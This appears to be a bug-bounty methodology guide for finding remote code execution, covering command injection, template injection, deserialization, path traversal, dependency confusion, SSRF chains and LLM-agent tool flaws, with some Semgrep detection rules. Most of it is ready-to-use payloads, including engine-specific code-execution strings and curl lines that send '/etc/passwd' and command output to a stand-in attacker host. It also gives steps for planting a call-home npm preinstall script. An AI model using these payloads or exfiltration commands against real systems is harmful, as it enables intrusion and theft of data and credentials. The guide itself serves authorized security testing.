# Hunt RCE — Deep Methodology

**Version:** 2026.2  
**Source:** 1,218-report distillation, HackerOne disclosed reports 2024-2026, NVD CVE analysis, PortSwigger research

---

## Attack Theory

RCE is execution of attacker-controlled code on the target server process. Delivery mechanisms: command injection, SSTI, deserialization, unsafe file parsing, dependency confusion, SSRF→internal service exploitation. The target is always a sink that passes user input to an execution primitive.

**Kill signals (skip target):**
- No user-controlled input reaches any execution sink (no file upload, no template rendering, no command invocation, no deserialization)
- All execution sinks hardened with allowlists (no metacharacters accepted)
- Target is static content only (no server-side processing)

---

## Surface Discovery (where RCE hides)

1. **Command invocation features**: ping/lookup, DNS tools, whois APIs, email-send servers, file converters (ffmpeg, imagemagick, unoconv), archive extraction (zip/tar/7z), PDF generators, video/image processors, SMS senders, OCR endpoints.
2. **Template rendering**: email/notification templates, PDF, report builders, invoice HTML, admin page bodies, error pages, markdown renderers with HTML enabled, docs-to-HTML.
3. **Deserialization points**: cookies, session state, cache keys, webhook payload replay, model artifacts, export/import, JMS/messaging, graphical modeler nodes.
4. **Upload chains**: file with extension/content bypass; archive with path traversal; polyglot content (SVG+XSLT, ImageMagick).
5. **Config-as-code**: user-supplied config (nginx conf, cron, Dockerfile, build args, CI variables, GitHub Actions expressions).
6. **MCP/agent surfaces** (2026): tool parameter schema → command execution paths; LLM agent tools (LangChain/CrewAI) calling OS/scripts.

## Sub-Techniques

### A. Command Injection
Direct OS command execution via shell metacharacters.
- Payloads: `; id`, `| id`, `&& id`, `\`id\``, `$(id)`, `%0aid`, `{id,}` (bash brace), `$'\x69\x64'` (quote wrapping)
- Blind: `; sleep 5`, `; curl attacker.com/$(id|base64)`
- Bypass: `$IFS` for spaces, `${IFS}`, `{cat,/etc/passwd}`, `'i'd`, `ca""t`, `\cat`
- OOB confirmation via interactsh: `; curl https://CANARY.oast.fun/$(hostname|base64 -w0)`
- Common sinks: ping/nslookup/traceroute params, hostname/domain fields, SMTP "to" fields, filename passthrough to system tools (ffmpeg, imagemagick, unzip, tar)
- **Windows**: `& whoami`, `| whoami`, `%CMD%`, `^` escaping, `+` for spaces (URL), `dir & whoami`
- **Pick the exact place**: only payload in the param, never multiple `;id;` in unrelated params.

### B. Server-Side Template Injection (SSTI)
Detect math probe first on ANY templated echo: `{{7*7}}` → 49, `${7*7}` → 49, `<%= 7*7 %>` → 49, `#{7*7}` (Ruby), `*{7*7}` (Groovy), `${{7*7}}` (Jinja2/erb).
Then engine-specific RCE:
- Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}...`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` — also `?new()`, `#{}` (in 2.3.2x), `[#assign]`
- Velocity: `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))...`
- **Angular Expression**: `{{constructor.constructor('return process.env')()}}`
- **Nunjucks**: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`
- **EJS**: `settings['view engine']` injection; `<%= process.mainModule.require('child_process').execSync('id').toString() %>`
- **handlebars**: `{{#with "s" as |string|}}...{{lookup string "constructor"}}` (Prototype access)
- **Pug/Slim/Haml** eval blocks; **Twig async** `{{filters|filter}}`
- Sinks: email templates, PDF generation templates, notification templates, report builders, error pages with user input, invoice designers, mail merge.

### C. Unsafe Deserialization
Loads from client-provided serialized bytes.
- Python: `pickle.loads(input)` — `__reduce__` chain
- Java: `ObjectInputStream.readObject()` — ysoserial (CommonsCollections, Spring, Hibernate, ROME, Groovy)
- PHP: `unserialize(input)` — PHPGGC chains (Symfony, Laravel, Cake)
- Node: `node-serialize`, `cryo` — `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`
- .NET: `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`
- Detection markers: base64 `rO0AB` (Java), `O:` (PHP), `ACED` hex prefix, `NAB[]` (Parcelable)
- Sinks: session cookies, state restore endpoints, cache keys, webhook payload replays, model artifacts, form serialization

### D. Path Traversal → RCE
- Read: `../../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2fetc%2fpasswd`
- Write: upload to documented-escaping path `/var/www/html/../shell.php`
- Log poisoning: inject PHP/other code into logs via User-Agent → include it via LFI
- Win: `..\..\..\windows\win.ini`, `..%5c..%5c` (encoded backslash)

### E. Dependency Confusion / Supply Chain
Internal package names resolved from public registries.
- Steps: read `package.json`/`requirements.txt`/`Gemfile` in public repo or exposed SCM; find non-public names; register public versions with install script that calls home.
- Payload: `{"scripts":{"preinstall":"curl .../$(hostname)"}}` → npm
- Confirm tool: `check_dependency_confusion` (security-research MCP), and pin: `npm view <pkg>` — if 404 → take it
- Only report after the target actually resolves the injected package at a real build/deploy; probe with README first, not malware.

### F. SSRF → Internal Service RCE
- AWS metadata → creds → console/API → RCE via internal services
- Kubernetes: `http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets` (often without auth)
- Redis gopher SSRF: `gopher://localhost:6379/_MULTI...` → cron; or `SET` + `SAVE` to webshell
- Memcached: set value, trigger deserialize
- Internal admin panels with weak creds — Jenkins (script console), Grafana (datasource plugin upload), Kibana `_search`?
- Cloud meta → IAM keys → AWS `ec2 run-instances` — chain on authorized infra only

### G. Agentic / LLM Tool RCE (2026 Priority)
- CVE-2025-68613: LangChain PythonREPLTool semantic RCE — LLM generates Python that executes system commands
- BentoML pickle deserialization via model API
- Tekton git arg injection (`--upload-pack`)
- Ollama register malicious model from attacker registry
- MCP servers: tool parameter schema injection, malicious tool response payloads

---

## OOB-First Payload Sequence

1. **Blind OOB first**: `; curl https://CANARY.interactsh.com/$(hostname|base64)` — zero-noise discovery
2. `interactsh_generate_url` → build payload → trigger → poll `interactsh_check_interactions`
3. Confirm execution: `; curl CANARY/$(whoami)` — id
4. Exfil: `; curl https://attacker.com/$(cat /etc/passwd|base64 -w0)`
5. Reverse shell only if PoC confirmed and scope allows active exploitation

## Semgrep Patterns
```yaml
rules:
  - id: command-injection-sink
    languages: [python, javascript, php, java, go]
    message: command/proc invocation with dynamic input
    severity: WARNING
    patterns:
      - pattern: 'subprocess.run($CMD, shell=True, ...)'
      - pattern: 'os.system($CMD)'
      - pattern: 'eval($INPUT)'
      - pattern: 'exec($INPUT)'
      - pattern: 'Runtime.getRuntime().exec($X)'
      - pattern: 'child_process.exec($X)'
      - pattern: 'shell_exec($X)'
  - id: unsafe-deserialization
    languages: [python, java, php, javascript]
    patterns:
      - pattern: 'pickle.loads($D)'
      - pattern: 'ObjectInputStream.readObject()'
      - pattern: 'unserialize($D)'
      - pattern: 'node-serialize.unserialize($D)'
```
Triage: source → sink with user-controlled data = escalate. Static hit without source = DEFERRED (not finding).

## Reporting Bar (what separates a report from noise)
- **Confirmed execution** (OOB callback received OR command output reflected) — payload reflection alone is NOT RCE
- **Impact demonstrated**: data exfil, file read, state change — not just `id`
- **Scope-proof**: REPLAY the same request/response pair
- **CVSS ≥ 7.0** for RCE (8.0+ if no auth required); H1 → 3.1, others → 4.0
- Chain ladder documented (SSRF→creds→RCE, upload→include→RCE)